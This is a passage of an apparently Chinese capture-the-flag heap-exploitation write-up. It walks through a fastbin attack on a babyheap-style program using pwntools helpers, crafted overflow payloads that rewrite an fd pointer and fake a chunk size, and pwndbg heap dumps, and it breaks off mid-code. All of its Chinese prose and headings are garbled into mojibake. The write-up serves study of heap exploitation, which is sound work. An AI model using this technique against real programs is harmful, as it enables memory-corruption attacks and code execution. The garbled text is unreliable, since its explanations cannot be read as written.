æ¨¡ä»¿ç¨‹åºåŠŸèƒ½"></a>1-1 æ¨¡ä»¿ç¨‹åºåŠŸèƒ½</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br></code></pre></td></tr></tbody></table></figure><p>è¿™4ä¸ªå‡½æ•°åˆ†åˆ«å¯¹åº”ç¨‹åºçš„å››ä¸ªä¸»è¦åŠŸèƒ½ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚</p><h4 id="1-2-ç”³è¯·-5ä¸ªchunk"><a href="#1-2-ç”³è¯·-5ä¸ªchunk" class="headerlink" title="1-2 ç”³è¯· 5ä¸ªchunk"></a>1-2 ç”³è¯· 5ä¸ªchunk</h4><p>ç”±äºæˆ‘ä»¬å¸Œæœ›ä½¿ç”¨ unsorted bin æ¥æ³„æ¼ libc åŸºåœ°å€ï¼Œ<strong>æ‰€ä»¥å¿…é¡»è¦æœ‰ chunk å¯ä»¥è¢«é“¾æ¥åˆ° unsorted bin ä¸­ï¼Œæ‰€ä»¥è¯¥ chunk ä¸èƒ½è¢«å›æ”¶åˆ° fastbin chunkï¼Œä¹Ÿä¸èƒ½å’Œ top chunk ç›¸é‚»ã€‚å› ä¸ºåè€…åœ¨ä¸æ˜¯fastbin çš„æƒ…å†µä¸‹ï¼Œä¼šè¢«åˆå¹¶åˆ° top chunk ä¸­ã€‚</strong>å…·ä½“è®¾è®¡å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br></code></pre></td></tr></tbody></table></figure><p>æ‰§è¡Œå®Œæ­¤payloadä¹‹åçš„heapæƒ…å†µå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">50</span>gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index0<br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index1<br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index2<br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index3<br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> #index4<br>......ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> #top_chunk<br></code></pre></td></tr></tbody></table></figure><p>æ­¤æ—¶ç¨‹åºç»“æ„ä½“ä¸­çš„æƒ…å†µï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98720</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    #index0<br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    #index1<br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757030</span><br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     #index2<br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757050</span><span class="hljs-number">0x0000000000000001</span><br>    #index3<br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    #index4<br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-3-freeåˆ›å»ºçš„index1å’Œindex2"><a href="#1-3-freeåˆ›å»ºçš„index1å’Œindex2" class="headerlink" title="1-3 freeåˆ›å»ºçš„index1å’Œindex2"></a>1-3 freeåˆ›å»ºçš„index1å’Œindex2</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#freeä¸¤ä¸ª,è¿™æ—¶å€™ä¼šæ”¾åˆ°fastbinsä¸­,è€Œä¸”å› ä¸ºæ˜¯åè¿›çš„,æ‰€ä»¥</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure><p>æ‰§è¡Œæ­¤éƒ¨åˆ†payloadï¼Œæ¥çœ‹ä¸€ä¸‹å †çŠ¶å†µï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757020</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#fdæŒ‡é’ˆæŒ‡å‘index1çš„èµ·å§‹åœ°å€</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>æ­¤æ—¶çš„binå’Œmain_arenaæƒ…å†µï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0000555555757020</span>-&gt;<span class="hljs-number">0x555555757040</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000555555757040</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000555555757110</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>ç¨‹åºçš„ç»“æ„ä½“çŠ¶å†µå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    #index0<br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000000</span><br>    #index1ï¼ˆchunk_flagç½®é›¶ï¼‰<br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>                #chunk_content_sizeç½®é›¶   #chunk_data_ptrç½®ç©º     <br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>     #index2ï¼ˆchunk_flagç½®é›¶ï¼‰  #chunk_data_sizeç½®é›¶     <br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000001</span><br>    #chunk_data_ptrç½®ç©º  #index3<br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    #index4<br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-4-å¯¹-index0-è¿›è¡Œ-fill-æ“ä½œï¼Œæº¢å‡ºä¿®æ”¹-index2-å’Œ-fd-æŒ‡é’ˆ"><a href="#1-4-å¯¹-index0-è¿›è¡Œ-fill-æ“ä½œï¼Œæº¢å‡ºä¿®æ”¹-index2-å’Œ-fd-æŒ‡é’ˆ" class="headerlink" title="1-4 å¯¹ index0 è¿›è¡Œ fill æ“ä½œï¼Œæº¢å‡ºä¿®æ”¹ index2 å’Œ fd æŒ‡é’ˆ"></a>1-4 å¯¹ index0 è¿›è¡Œ fill æ“ä½œï¼Œæº¢å‡ºä¿®æ”¹ index2 å’Œ fd æŒ‡é’ˆ</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br></code></pre></td></tr></tbody></table></figure><p>è¿˜è®°å¾—ä¸Šé¢æåˆ°çš„ç¨‹åºæ¼æ´å—ï¼Ÿ<br>ç¬¬ä¸€æ¬¡æ‰§è¡ŒAllocateå‡½æ•°æ—¶chunk_content_sizeæ˜¯æˆ‘ä»¬æŒ‡å®šçš„ï¼Œä½†æ˜¯fillçš„æ—¶å€™å¹¶æ²¡æœ‰å°†æ–°çš„chunk_content_sizeå†™å…¥åˆ°ç»“æ„ä½“ä¸­ï¼Œå¹¶ä¸”ä¹‹å‰alloc chunkæ—¶æŒ‡å®šçš„å †å—sizeå¤§å°æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥è¿™é‡Œå°±å‡ºç°äº†ä»»æ„å †æº¢å‡ºçš„æƒ…å½¢ã€‚<br>è¿™ä¸€å°æ®µpayloadçš„ç›®çš„æ˜¯ï¼šé€šè¿‡fill index0æº¢å‡ºä¿®æ”¹index2çš„fdæŒ‡é’ˆä¸ºindex4çš„åœ°å€ï¼Œæ­¤å¤„çš„payloadåªç”¨ä¿®æ”¹fdçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¸º0x80å³å¯ã€‚<br>æ‰§è¡Œpayloadä¹‹åçš„å†…å­˜ç©ºé—´å¦‚ä¸‹ï¼š</p><blockquote><p>chunk2-&gt;fdå·²æˆåŠŸä¿®æ”¹ä¸ºchunk4çš„èµ·å§‹åœ°å€ï¼ˆè¿™ä¸ªèµ·å§‹åœ°å€æ˜¯æŒ‡å‘chunk headerçš„ï¼‰</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#payloadä»è¿™é‡Œå¼€å§‹ä¿®æ”¹å †å—å†…å®¹</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2ï¼ˆfastbinï¼‰</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757080</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#æ­¤å¤„çš„fdæŒ‡é’ˆå·²ç»è¢«ä¿®æ”¹</span><br>--------------------------------------------------------------    <br>æ‰§è¡Œpayloadå‰åŸæ¥çš„å†…å®¹ä¸ºï¼š<br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757020</span><span class="hljs-number">0x0000000000000000</span><br>--------------------------------------------------------------    <br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4ï¼ˆfastbinï¼‰</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure><h4 id="1-5-å¯¹-index3-è¿›è¡Œfillæ“ä½œï¼Œå°†-index4-çš„å¤§å°ä¿®æ”¹ä¸º-0x21"><a href="#1-5-å¯¹-index3-è¿›è¡Œfillæ“ä½œï¼Œå°†-index4-çš„å¤§å°ä¿®æ”¹ä¸º-0x21" class="headerlink" title="1-5 å¯¹ index3 è¿›è¡Œfillæ“ä½œï¼Œå°† index4 çš„å¤§å°ä¿®æ”¹ä¸º 0x21"></a>1-5 å¯¹ index3 è¿›è¡Œfillæ“ä½œï¼Œå°† index4 çš„å¤§å°ä¿®æ”¹ä¸º 0x21</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ç„¶åå†é€šè¿‡index3å»è¿›è¡Œå†™å…¥,æŠŠindex4çš„å¤§å°æ”¹æˆ0x21</span><br><span class="hljs-comment">#è¿™ä¹ˆåšæ˜¯å› ä¸ºå½“ç”³è¯·index4è¿™å—å†…å­˜çš„æ—¶å€™,ä»–ä¼šæ£€æŸ¥å¤§å°æ˜¯ä¸æ˜¯fastbinçš„èŒƒå›´å†…ï¼ˆè¯·æ³¨æ„è¿™ç‚¹)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2ï¼ˆfastbinï¼‰</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757080</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4ï¼ˆfastbinï¼‰</span><br>--------------------------------------------------------------    <br>æ‰§è¡Œpayloadå‰åŸæ¥çš„å†…å®¹ä¸ºï¼š<br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4ï¼ˆfastbinï¼‰</span><br>-------------------------------------------------------------- <br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>å†æ¬¡å¼ºè°ƒï¼Œåœ¨ç”³è¯·fastbinä¸­å†…å­˜æ—¶ï¼Œä¼šæ£€æŸ¥è¢«é‡Šæ”¾å †å—çš„sizeï¼ˆå¤§å°ï¼‰æ˜¯å¦åœ¨fastbinçš„èŒƒå›´å†…ï¼Œå¦‚æœä¸åœ¨ï¼Œç¨‹åºåˆ™å¼‚å¸¸é€€å‡ºï¼Œè¿™æœ‰å…³äºfastbinçš„æœºåˆ¶ã€‚ç»“æ„ä½“çŠ¶å†µæœªå‘ç”Ÿæ”¹å˜ã€‚</p><h4 id="1-6-ç”³è¯·-index4"><a href="#1-6-ç”³è¯·-index4" class="headerlink" title="1-6 ç”³è¯· index4"></a>1-6 ç”³è¯· index4</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#æ”¹å¥½index4çš„å¤§å°ä¹‹åå»ç”³è¯·ä¸¤æ¬¡ï¼Œè¿™æ ·å°±æŠŠåŸæ¥çš„fastbinä¸­çš„ç»™ç”³è¯·å‡ºæ¥äº†</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#ç”³è¯·æˆåŠŸä¹‹åindex2å°±æŒ‡å‘index4</span><br></code></pre></td></tr></tbody></table></figure><p>é¦–å…ˆæ˜¯ä¸¤ä¸ªmallocï¼Œå‰é¢fastbiné‡Œä¸€å¼€å§‹æ˜¯ä¸¤ä¸ªchunkï¼Œåˆ†åˆ«ä¸ºindex2-&gt;index1ï¼Œåæ¥æˆ‘ä»¬ä¿®æ”¹index2-&gt;fdä¸ºindex4çš„åœ°å€ï¼Œfastbiné‡Œå˜ä¸º</p><p>index2-&gt;index4ã€‚ç¬¬ä¸€ä¸ªmallocä¼šå…ˆåˆ†é…index2ç»™æˆ‘ä»¬ï¼ˆfastbinåˆ†é…åŸåˆ™æ˜¯LIFOå³åè¿›å…ˆå‡ºï¼‰ï¼Œç¬¬äºŒä¸ªmallocä¼šå°†index4åˆ†é…ç»™æˆ‘ä»¬ã€‚<br>çœ‹ä¸€ä¸‹å †ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 